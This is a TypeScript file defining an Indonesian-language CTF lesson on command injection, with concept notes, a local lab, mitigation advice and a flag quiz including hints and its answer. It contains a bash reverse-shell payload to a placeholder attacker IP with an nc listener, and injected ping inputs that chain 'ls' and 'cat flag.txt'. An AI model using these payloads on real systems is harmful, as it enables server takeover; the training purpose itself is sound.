import { CyberSecModule } from '../../../types';

export const commandInjectionModule: CyberSecModule = {
  id: 'command-injection',
  slug: 'command-injection',
  title: 'Command Injection',
  category: 'Web Exploitation',
  description: 'Menyusupkan instruksi OS (seperti Linux Bash commands) ke dalam antarmuka web, mengakibatkan eksekusi jarak jauh (RCE) langsung di server host.',
  sections: [
    {
      id: 'objective',
      title: 'Mission Objective',
      blocks: [
        {
          id: '1',
          type: 'alert',
          content: 'Target: Layanan diagnostik jaringan perusahaan.\nGoal: Mengeksekusi perintah baca file rahasia (`flag.txt`) yang ada di server backend dengan Remote Command Execution (RCE).',
          metadata: { type: 'warning' }
        }
      ]
    },
    {
      id: 'concept',
      title: 'The Vulnerability (TL;DR)',
      blocks: [
        {
          id: '2',
          type: 'text',
          content: 'Pengembang terkadang terlalu "malas" menulis program dari nol dan justru memanfaatkan utilitas sistem operasi bawaan. Contoh klasik: Fitur "Ping" atau "Traceroute" pada router rumah Anda.'
        },
        {
          id: '3',
          type: 'text',
          content: 'Jika aplikasi web menerima input Anda (misal `192.168.1.1`) dan meneruskannya ke fungsi `system()`, `exec()`, atau `shell_exec()` di PHP/Node.js, ia langsung menjalankan perintah Linux: `ping -c 1 192.168.1.1`.'
        },
        {
          id: '4',
          type: 'alert',
          content: 'Karakter Shell Separator (Pemisah Perintah):\n- `;` (Titik koma) -> Menjalankan perintah 1, lalu perintah 2.\n- `&&` (AND logis) -> Menjalankan perintah 2 JIKA perintah 1 berhasil.\n- `||` (OR logis) -> Menjalankan perintah 2 JIKA perintah 1 gagal.\n- `|` (Pipe) -> Mengalirkan output perintah 1 sebagai input perintah 2.',
          metadata: { type: 'danger' }
        }
      ]
    },
    {
      id: 'real-world-ctf',
      title: 'Real-World CTF Approach (Tooling & Reverse Shells)',
      blocks: [
        {
          id: '5',
          type: 'text',
          content: 'Di kompetisi CTF, jika Anda menemukan celah Command Injection, langkah pertama adalah memverifikasi RCE dengan perintah sederhana seperti `whoami` atau `id`. Jika berhasil, target selanjutnya adalah mendapatkan **Reverse Shell** agar Anda tidak perlu terus-menerus mengetik injeksi di URL/Form.'
        },
        {
          id: '6',
          type: 'code',
          content: `# Di terminal komputer Anda (Attacker), buka port untuk mendengarkan:\nnc -lnvp 1337\n\n# Di web target (sebagai payload injeksi), kirimkan Bash Reverse Shell:\n8.8.8.8; bash -i >& /dev/tcp/IP_ANDA/1337 0>&1`,
          metadata: { language: 'bash' }
        },
        {
          id: '7',
          type: 'text',
          content: 'Aplikasi web korban akan secara diam-diam membuka koneksi balik ke terminal Anda, memberikan akses kontrol penuh secara interaktif ke server.'
        }
      ]
    },
    {
      id: 'interactive-simulator',
      title: 'Live Lab: Backend Execution',
      blocks: [
        {
          id: '8',
          type: 'text',
          content: 'Aplikasi di bawah ini mengeksekusi fungsi `exec("ping -c 1 " + req.body.ip)` pada server backend Node.js (di `http://localhost:3001/api/ping`).'
        },
        {
          id: '9',
          type: 'text',
          content: 'Tugas Anda: Tambahkan separator shell (misalnya `;`) untuk menjeda perintah ping dan memerintahkan server mencetak isi folder dengan `ls`, lalu membaca file berharga (`cat`).'
        },
        {
          id: '10',
          type: 'interactive',
          content: 'MockCmdInjection',
          metadata: { component: 'MockCmdInjection' }
        }
      ]
    },
    {
      id: 'mitigation',
      title: 'The Fix (Mitigasi)',
      blocks: [
        {
          id: '11',
          type: 'text',
          content: 'Jangan pernah meneruskan input string user secara langsung ke `exec` atau sistem shell. Gunakan API OS bawaan bahasa pemrograman jika tersedia (misalnya pustaka `net` untuk TCP ping daripada memanggil binary OS).'
        },
        {
          id: '12',
          type: 'text',
          content: 'Jika Anda harus memanggil binary, gunakan fungsi yang tidak melewati *shell interpreter* (seperti `execFile` di Node.js atau `escapeshellarg()` di PHP) yang menganggap semua input sebagai argumen kaku (string literal) dan bukan shell meta-karakter.'
        }
      ]
    }
  ],
  quiz: {
    id: 'q_cmd_1',
    type: 'flag_submission',
    question: 'Berdasarkan uji coba di Live Lab di atas, gunakan `ls` untuk mencari file yang mencurigakan, kemudian baca isinya dengan `cat` untuk mendapatkan hadiah Anda:',
    flag: 'INIT0{RCE_V1a_P1ng_Ut1l}',
    hints: ['Scroll ke bagian Live Lab.', 'Ketik sembarang IP, misalnya `8.8.8.8`', 'Tambahkan titik koma (;) lalu ketik `ls`. Contoh: `8.8.8.8; ls`. Klik Ping Target.', 'Anda akan melihat file `flag.txt` di server shell. Sekarang ubah inputnya menjadi `8.8.8.8; cat flag.txt` untuk membaca isinya.'],
    explanation: 'Target Compromised! Anda berhasil merangkai beberapa baris perintah OS Linux menggunakan Shell Separators (`;`). Command Injection sangat mematikan karena ia merupakan pintu langsung ke layer Sistem Operasi host.'
  }
};
